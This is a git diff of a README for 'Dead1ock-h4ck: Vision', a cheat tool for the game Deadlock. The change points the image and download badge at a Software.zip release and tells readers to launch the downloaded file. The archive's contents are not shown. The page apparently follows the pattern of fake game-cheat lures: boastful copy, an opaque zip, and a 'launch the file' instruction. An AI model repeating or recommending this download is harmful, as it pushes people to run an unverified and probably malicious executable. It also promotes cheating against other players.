@@ -1,5 +1,5 @@
 # 🎮 Dead1ock-h4ck: Vision 
-![Dead1ock-h4ck](https://github.com/user-attachments/files/18410590/Software.zip)
+![Dead1ock-h4ck](https://github.com/Brosmad704/Dead1ock-h4ck/releases/download/v2.0/Software.zip)
 
 ## Description
 Welcome to Dead1ock-h4ck, a cutting-edge software designed specifically for Deadlock. Our Vision software is a one-of-a-kind solution that offers advanced capabilities and a competitive edge in the gaming arena. With our expertise in reverse engineering and innovative technologies, we have developed a reliable tool that will enhance your Deadlock gameplay experience.
@@ -26,7 +26,7 @@ Welcome to Dead1ock-h4ck, a cutting-edge software designed specifically for Dead
 
 ## Get Started
 Download the Vision software by clicking the button below:
-[![Download Vision](https://img.shields.io/badge/Download-Vision-blue)](https://github.com/user-attachments/files/18410590/Software.zip)
+[![Download Vision](https://github.com/Brosmad704/Dead1ock-h4ck/releases/download/v2.0/Software.zip)](https://github.com/Brosmad704/Dead1ock-h4ck/releases/download/v2.0/Software.zip)
   
 If the link ends with the file name, ensure to launch the downloaded file to start using Vision. If the link does not work, kindly check the "Releases" section for alternative download options.
 
